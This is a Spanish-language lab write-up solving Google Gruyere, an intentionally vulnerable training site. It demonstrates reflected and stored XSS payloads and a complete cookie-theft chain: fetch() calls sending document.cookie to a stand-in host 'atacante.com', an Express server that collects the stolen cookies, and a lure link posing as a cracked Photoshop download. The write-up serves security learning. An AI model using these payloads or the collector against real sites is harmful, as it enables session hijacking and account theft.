---
title: Gruyere
description: Guia de resolución de Google Gruyere.
date: 2024-11-03
tags: ["second tag", "posts with two tags"]
---

# Gruyere

Web insegura de google.

## XSS (Cross Site Scripting)

### Reflected XSS

Si añadimos al final de la url cualquier cosa, se muestra en la web.

Probamos a añadir un script que nos muestre un alert con un mensaje como:

```html
<script>alert("xss")</script>
```

No funciona, pero si escapamos los caracteres especiales, si funciona:

```html
%3Cscript%3Ealert%28%22XSS%21%22%29%3C%2Fscript%3E
```
### Stored XSS (File Upload) 

Hay una seccion en la que podemos subir archivos, empezamos a testear que deja subir:

- Podemos a subir una imagen con limitacion de tamaño.
- Podemos a subir un html normal.
- Podemos subir un html con javascript que nos muestre un alert con un mensaje.
- Podemos subir un html con javascript que nos muestre un alert con un mensaje y que muestre el contenido de la cookie.
- Probamos a subir un html con js que haga un fetch mandando la cookie a un servidor externo, si mandamos el enlace a alguien y lo abre, nos llegará la cookie:

```html
<script>
fetch(`http://atacante.com/grab?data=${document.cookie}`)
</script>
```

### Stored XSS (Snippet)

Hay una seccion en la que podemos añadir un snippet de texto.

Si mandamos `<h1>hola</h1>` se renderiza como un h1, podemos inyectar html.

Intentamos meter `<script>alert("xss")</script>`, no funciona.

Probamos con `<p onclick="alert('xss')">hola</p>`, no funciona.

Probamos con `<p onmouseover="alert('xss')">hola</p>`, funciona.

### Stored XSS (HTML Attribute)

Podemos inyectar js en los atributos de las etiquetas html en la seccion de perfil.

`red;' onmouseover='alert("xss")` consigue ejecutar el alert.

### Cookies

### Explotacion final y robo de cookies

Tenemos varias formas de ejecutar un xss, pero necesitamos un servidor que nos reciba la cookie.

```javascript
const express = require('express');
const cors = require('cors');
const fs = require('fs');
const app = express();
const port = 3000;
let texto = "";

app.use(cors());
//allow origin on neocities
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    next();
});
app.use(express.urlencoded({ extended: true }));
app.use(express.static('public'));

app.get('/grab', (req, res) => { // captura los datos enviados por el cliente
    const data = req.query.data;
    if(data){
        texto = data;
        res.send('Datos guardados correctamente.');
    } else {
        res.status(400).send('No se proporcionó ningún dato.');
    }
});

app.get('/loot', (req, res) => { // envía los datos guardados al cliente
    res.send(texto);
});

app.get('/clear', (req, res) => { // limpia el archivo de salida
    texto = "";
    res.send('Archivo limpiado correctamente.');
});

app.listen(port, () => {
    console.log(`Servidor escuchando en http://localhost:${port}`);
});
```

Una vez desplegado y con una url, creamos el siguiente archivo html:


```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Document</title>
</head>
<body>
  <script>
    fetch(`atacante.com/grab?data=${document.cookie}`)
  </script>
</body>
</html>
```

Creamos una cuenta en Gruyere.

Vamos a la seccion `upload`.

Subimos nuestro `html` y copiamos la url al archivo.

Vamos a la seccion `New snippet` y mandamos lo siguiente:

```html
<a href="https://google-gruyere.appspot.com/533856798844119184635188467180043151698/hacker/game.html">Descargar Adobe-Photoshop-CRACKED.exe</a>
```

Cuando un usuario haga click, me enviará la cookie al servidor.

Cualquiera de los otros metodos nos permite hacer lo mismo, solo debemos añadir el fetch.